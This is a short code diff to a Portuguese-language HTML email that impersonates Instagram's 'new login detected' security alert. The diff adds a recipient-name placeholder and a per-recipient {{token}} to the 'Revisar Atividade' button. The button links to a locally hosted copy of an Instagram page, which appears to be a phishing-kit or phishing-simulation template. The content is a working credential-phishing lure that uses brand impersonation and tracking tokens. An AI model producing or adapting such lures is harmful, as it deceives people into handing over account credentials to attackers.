@@ -26,7 +26,7 @@
         
         <h1>Detectamos um novo login na sua conta.</h1>
         
-        <p>Olá,!</p>
+           <p>Olá, {{nome}}!</p>
         <p>Houve um login na sua conta do Instagram a partir de um novo dispositivo que você não costuma usar.</p>
         
         <div class="details-box">
@@ -38,7 +38,7 @@
         
         <p>Se não foi você, por favor, clique no botão abaixo para revisar e proteger sua conta.</p>
         
-        <a href="http://localhost:8000/instagram/index.html" class="button">Revisar Atividade</a>
+    <a href="http://localhost:8000/instagram/index.html?token={{token}}" class="button">Revisar Atividade</a>
         
         <p style="margin-top: 30px;">Obrigado,</p>
         <p style="margin-bottom: 0;">A Equipe do Instagram</p>
